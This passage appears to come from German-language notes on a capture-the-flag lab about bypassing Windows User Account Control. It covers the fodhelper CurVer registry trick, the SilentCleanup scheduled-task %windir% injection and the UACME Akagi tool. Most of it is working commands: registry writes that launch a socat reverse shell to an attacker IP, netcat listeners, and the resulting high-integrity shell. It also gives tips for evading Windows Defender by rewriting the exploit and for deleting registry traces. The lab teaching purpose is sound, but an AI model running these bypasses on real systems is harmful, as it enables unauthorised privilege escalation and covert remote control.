Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

Windows Defender warnt weiterhin vor der Umgehung. Das Problem bei unserem aktuellen Exploit ist, dass er wenig Spielraum für Variationen lässt, da wir spezifische Registrierungsschlüssel schreiben müssen, um ihn auszulösen, was es Windows Defender leicht macht, ihn zu erkennen. Aber es gibt noch etwas, das wir dagegen tun können.

### Verbesserung des "fodhelper"-Exploits

Eine Variation des "fodhelper"-Exploits wurde von [@V3ded](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses) vorgeschlagen, bei der andere Registrierungsschlüssel verwendet werden, aber das Grundprinzip dasselbe bleibt.

Anstatt unser Payload in `HKCU\Software\Classes\ms-settings\Shell\Open\command` zu schreiben, verwenden wir den Eintrag `CurVer` unter einem "progID"-Registrierungsschlüssel. Dieser Eintrag wird verwendet, wenn Sie mehrere Instanzen einer Anwendung mit verschiedenen Versionen auf demselben System ausführen. "CurVer" ermöglicht es Ihnen, auf die Standardversion der Anwendung zu verweisen, die von Windows beim Öffnen eines bestimmten Dateityps verwendet werden soll.

Zu diesem Zweck erstellen wir einen Eintrag in der Registrierung für eine neue "progID" unserer Wahl (jeder Name ist möglich) und verweisen dann im "ms-settings progID" Eintrag "CurVer" auf unsere neu erstellte "progID". Auf diese Weise, wenn "fodhelper" versucht, ein Programm mit dem "ms-settings progID" zu öffnen, wird es den "CurVer"-Eintrag bemerken, der auf unsere neue "progID" verweist, und überprüfen, welchen Befehl es verwenden soll.

Der von @V3ded vorgeschlagene Exploit-Code verwendet PowerShell, um dies zu erreichen. Hier ist eine angepasste Version davon, um unsere Reverse-Shell zu verwenden (stellen Sie sicher, dass Sie Ihre IP-Adresse entsprechend ersetzen):
```powershell
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
    
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
    
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

Dieser Exploit erstellt eine neue progID mit dem Namen **.pwn** und verknüpft unser Payload mit dem Befehl, der beim Öffnen solcher Dateien verwendet wird. Dann verweist er den CurVer Eintrag von ms-settings auf unsere .pwn progID. Wenn "fodhelper" versucht, ein ms-settings Programm zu öffnen, wird es stattdessen auf die .pwn progID verwiesen und verwendet den zugehörigen Befehl.

Diese Technik ist wahrscheinlicher, Windows Defender zu umgehen, da wir mehr Freiheit haben, wo wir unser Payload platzieren, da der Name der "progID", die unser Payload enthält, völlig willkürlich ist. Starten wir eine neue Reverse-Shell auf dem Angreifer-Rechner:
`nc -lvp 4445`

Und führen den Exploit von unserer Backdoor-Verbindung aus. Als Ergebnis wird Windows Defender einen weiteren Alarm auslösen, der auf unsere Aktionen verweist:  
![2024-07-08-36a12bfed5c44fedf170f934bd4bc9ca.png](Bilder/2024-07-08-36a12bfed5c44fedf170f934bd4bc9ca.png)

Obwohl wir weiterhin erkannt werden, ist es wichtig zu beachten, dass die Erkennungsmethoden von Antivirensoftware manchmal streng gegen den veröffentlichten Exploit implementiert werden, ohne mögliche Variationen zu berücksichtigen. Wenn wir unseren Exploit von PowerShell auf cmd.exe übersetzen, wird der Virenschutz keine Alarme auslösen (stellen Sie sicher, dass Sie Ihre IP-Adresse entsprechend ersetzen):
```cmd
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

C:\> reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
The operation completed successfully.

C:\> reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
The operation completed successfully.

C:\> fodhelper.exe
```

Und wir erhalten eine Reverse-Shell mit hoher Integrität:
```shell
user@kali$ nc -lvp 4445      
Listening on 0.0.0.0 4445
Connection received on 10.10.183.127 23441
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

Um die "fodhelper-curver"-Flagge abzurufen, verwenden Sie Ihre neue Shell und führen Sie folgenden Befehl aus:
```cmd
C:\> C:\flags\GetFlag-fodhelper-curver.exe
```

**Hinweis: Beachten Sie, dass die Flagge nur zurückgegeben wird, wenn Sie die UAC erfolgreich über "fodhelper" umgangen haben und nur von der resultierenden Shell mit hoher Integrität über "socat".**

### Spuren beseitigen

Durch die Ausführung dieses Exploits wurden einige Artefakte auf dem Zielsystem erstellt, wie beispielsweise Registrierungsschlüssel. Um eine Erkennung zu vermeiden, müssen wir die Spuren mit den folgenden Befehlen beseitigen:
```cmd
reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```

**Hinweis: Stellen Sie sicher, dass Sie die angegebenen Befehle ausführen, um zu vermeiden, dass Artefakte die folgenden Aufgaben beeinträchtigen.**

## Fragen:
Welche Flagge wird durch die Ausführung des "fodhelper-curver"-Exploits zurückgegeben?
```

```

# Task 6 - UAC: Erweiterung der Umgebungsvariablen
### Umgehung der Einstellung "Immer benachrichtigen"

Wie im vorherigen Abschnitt gezeigt, können Sie in den Standardeinstellungen von Windows Anwendungen, die mit der Systemkonfiguration zusammenhängen, ausnutzen, um die Benutzerkontensteuerung (UAC) zu umgehen, da die meisten dieser Apps das Flag "autoElevate" in ihren Manifesten gesetzt haben. Wenn UAC jedoch auf die Stufe "Immer benachrichtigen" konfiguriert ist, können "fodhelper" und ähnliche Apps nicht genutzt werden, da der Benutzer aufgefordert wird, den UAC-Dialog zu bestätigen, um die Rechte zu erhöhen. Dies würde mehrere bekannte Umgehungsmethoden verhindern, aber es gibt dennoch Hoffnung.

Für die folgende Technik werden wir eine geplante Aufgabe missbrauchen, die von jedem Benutzer ausgeführt werden kann, jedoch mit den höchsten dem Anrufer verfügbaren Rechten ausgeführt wird. Geplante Aufgaben sind ein interessantes Ziel. Sie sind so konzipiert, dass sie ohne Benutzerinteraktion ausgeführt werden (unabhängig vom UAC-Sicherheitslevel), sodass das manuelle Erhöhen eines Prozesses durch den Benutzer keine Option ist. Geplante Aufgaben, die eine Erhöhung der Rechte erfordern, erhalten diese automatisch, ohne dass ein UAC-Dialog durchlaufen wird.

### Fallstudie: Geplante Aufgabe "Datenträgerbereinigung"

**Hinweis: Deaktivieren Sie Windows Defender für diese Aufgabe, da es sonst zu Schwierigkeiten beim Ausführen des Exploits kommen kann. Verwenden Sie einfach die auf dem Desktop Ihres Rechners bereitgestellte Verknüpfung, um ihn zu deaktivieren.**

Um zu verstehen, warum wir die Datenträgerbereinigung auswählen, öffnen wir den **Task Scheduler** und überprüfen die Konfiguration der Aufgabe:
![2024-07-08-24b5ce8c9a6cb1194ed66054bc2ed09e.png](Bilder/2024-07-08-24b5ce8c9a6cb1194ed66054bc2ed09e.png)

Hier sehen wir, dass die Aufgabe so konfiguriert ist, dass sie mit dem **Benutzerkonto** ausgeführt wird, was bedeutet, dass sie die Rechte des aufrufenden Benutzers erbt. Die Option "Mit höchsten Privilegien ausführen" verwendet das höchste Privileg-Sicherheitstoken, das dem aufrufenden Benutzer zur Verfügung steht, was für einen Administrator ein Token mit hoher Integritätsstufe (IL) ist. Beachten Sie, dass, wenn ein normaler Benutzer ohne Administratorrechte diese Aufgabe aufruft, sie nur mit mittlerer IL ausgeführt wird, da dies das höchste Privileg ist, das Nicht-Administratoren zur Verfügung steht, und daher die Umgehung nicht funktionieren würde.

Überprüfen Sie die Registerkarten "Aktionen" und "Einstellungen", wir haben Folgendes:
![2024-07-08-3b8dd4c6a441eb19620bc3bedd536a8b.png](Bilder/2024-07-08-3b8dd4c6a441eb19620bc3bedd536a8b.png)

Die Aufgabe kann auf Abruf ausgeführt werden und führt beim Aufruf den folgenden Befehl aus:

`%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%`

Da der Befehl von Umgebungsvariablen abhängt, könnten wir möglicherweise Befehle durch sie injizieren und sie ausführen lassen, indem wir die Datenträgerbereinigungsaufgabe manuell starten.

Glücklicherweise können wir die Variable `%windir%` über die Registrierung überschreiben, indem wir einen Eintrag in `HKCU\Environment` erstellen. Wenn wir eine Reverse-Shell mit socat ausführen möchten, können wir `%windir%` wie folgt festlegen (ohne die Anführungszeichen):

`"cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM "`

Am Ende unseres Befehls fügen wir "&REM " (mit einem Leerzeichen am Ende) hinzu, um alles, was nach `%windir%` steht, zu kommentieren, wenn die Umgebungsvariable erweitert wird, um den endgültigen Befehl zu erhalten, der von der Datenträgerbereinigung verwendet wird. Der resultierende Befehl wäre (stellen Sie sicher, dass Sie Ihre IP-Adresse entsprechend ersetzen):

`cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%`

Wobei alles nach "REM" als Kommentar ignoriert wird.

### Alles zusammenfügen

Richten wir einen Listener für eine Reverse-Shell mit nc ein:
`nc -lvp 4446`

Dann verbinden wir uns mit der Backdoor auf Port 9999:
`nc MACHINE_IP 9999`

Und führen schließlich die folgenden Befehle aus, um unser Payload in `%windir%` zu schreiben und dann die Datenträgerbereinigungsaufgabe auszuführen (stellen Sie sicher, dass Sie Ihre IP-Adresse entsprechend ersetzen):
```cmd
C:\> reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f

C:\> schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

Als Ergebnis sollten Sie eine Shell mit hoher IL erhalten:
```shell
user@kali$ nc -lvp 4446      
Listening on 0.0.0.0 4446
Connection received on 10.10.183.127 25631
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

Um die "DiskCleanup"-Flagge abzurufen, verwenden Sie Ihre neue Shell und führen Sie folgenden Befehl aus:
```cmd
C:\flags\GetFlag-diskcleanup.exe
```

**Hinweis: Beachten Sie, dass die Flagge nur zurückgegeben wird, wenn Sie UAC erfolgreich über "diskcleanup" umgangen haben und nur von der resultierenden Shell mit hoher Integrität über "socat".**

### Spuren beseitigen

Durch die Ausführung dieses Exploits wurden einige Artefakte auf dem Zielsystem erstellt, wie beispielsweise Registrierungsschlüssel. Um eine Erkennung zu vermeiden, müssen wir die Spuren mit folgendem Befehl beseitigen:
```cmd
reg delete "HKCU\Environment" /v "windir" /f
```

**Hinweis: Stellen Sie sicher, dass Sie den angegebenen Befehl ausführen, um zu vermeiden, dass Artefakte die folgenden Aufgaben beeinträchtigen. Da viele Windows-Komponenten auf die Umgebungsvariable %windir% angewiesen sind, werden viele Dinge nicht richtig funktionieren, bis Sie den für diese Umgehung verwendeten Registrierungsschlüssel entfernen.**

## Fragen:
Welche Flagge wird durch die Ausführung des "DiskCleanup"-Exploits zurückgegeben?
```

```

# Task 7 - Automatisierter Exploit
Automatisierung von UAC-Umgehungen

Ein hervorragendes Tool zum Testen von UAC-Umgehungen, ohne die Exploits von Grund auf neu schreiben zu müssen, steht zur Verfügung. Erstellt von @hfiref0x, bietet UACME ein aktuelles Repository von UAC-Umgehungstechniken, die sofort verwendet werden können. Das Tool ist im offiziellen Repository verfügbar unter:

[https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)

Während UACME mehrere Werkzeuge bereitstellt, konzentrieren wir uns hauptsächlich auf das Tool namens Akagi, das die eigentlichen UAC-Umgehungen durchführt. Eine kompilierte Version von Akagi finden Sie unter C:\tools\UACME-Akagi64.exe.

Die Verwendung des Tools ist unkompliziert und erfordert lediglich die Angabe der Nummer, die der zu testenden Methode entspricht. Eine vollständige Liste der Methoden ist in der Projektbeschreibung auf GitHub verfügbar. Wenn Sie Methode 33 testen möchten, können Sie dies folgendermaßen über die Eingabeaufforderung tun, und eine cmd.exe mit hoher Integrität wird angezeigt:
```cmd
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\attacker>cd /tools

C:\tools>UACME-Akagi64.exe 33
```

Die in diesem Raum vorgestellten Methoden können ebenfalls von UACME getestet werden, indem die folgenden Methoden verwendet werden:
| Methoden-ID | Umgehungstechnik                          |
|-------------|-------------------------------------------|
| 33          | fodhelper.exe                             |
| 34          | Geplante Aufgabe "Datenträgerbereinigung" |
| 70          | fodhelper.exe unter Verwendung des CurVer-Registrierungsschlüssels |

# Task 8 - Abschluss
Wir haben in diesem Raum mehrere Methoden zur Umgehung der Benutzerkontensteuerung (UAC) in Windows-Systemen gezeigt. Während die meisten dieser Methoden mit automatischen Tools verbunden sind, werden sie von jeder auf dem Markt erhältlichen Antivirensoftware leicht erkannt, wenn sie unverändert verwendet werden. Das Wissen über die tatsächlichen Methoden verschafft Ihnen als Angreifer einen Vorteil, da Sie Ihre Exploits nach Bedarf anpassen und sie schwerer erkennbar machen können.

Wie wir gesehen haben, wird UAC nicht als Sicherheitsgrenze betrachtet und ist daher anfällig für mehrere Umgehungsmethoden.

Sollten Sie daran interessiert sein, weitere Techniken zu erlernen, stehen Ihnen die folgenden Ressourcen zur Verfügung:

- [UACME GitHub Repository]([https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME))
- [Bypassing UAC with Mock Folders and DLL Hijacking]([https://example.com](https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/))
- [Reading Your Way Around UAC]([https://example.com](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html))
